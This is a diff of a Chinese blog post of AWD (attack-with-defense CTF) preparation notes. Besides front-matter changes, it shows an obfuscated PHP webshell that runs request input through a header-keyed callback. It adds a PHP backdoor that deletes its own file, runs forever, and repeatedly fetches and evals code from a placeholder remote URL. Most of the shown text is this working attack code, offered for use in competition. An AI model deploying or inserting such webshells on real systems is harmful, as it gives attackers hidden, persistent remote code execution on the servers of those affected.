@@ -1,8 +1,9 @@
 ---
-title: awd准备工作
+jtitle: awd准备工作
+password: awd-prepare
+abbrlink: 12920
 date: 2018-08-21 10:32:18
 tags:
-password: awd-prepare
 ---
 
 # 准备工作
@@ -287,6 +288,19 @@ $key = substr(__FILE__,-5,-4);
 ${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
 $f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
 array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
+?>
+```
+
+```php
+<?php
+    unlink($_SERVER['SCRIPT_FILENAME']);     //删除脚本
+    ignore_user_abort(true);
+    set_time_limit(0);
+    $remote_file = 'http://xxx/xxx.txt';               // 从远端获取指令
+    while($code = file_get_contents($remote_file)){
+    @eval($code);
+    sleep(5);
+};
 ?>
 ```
 
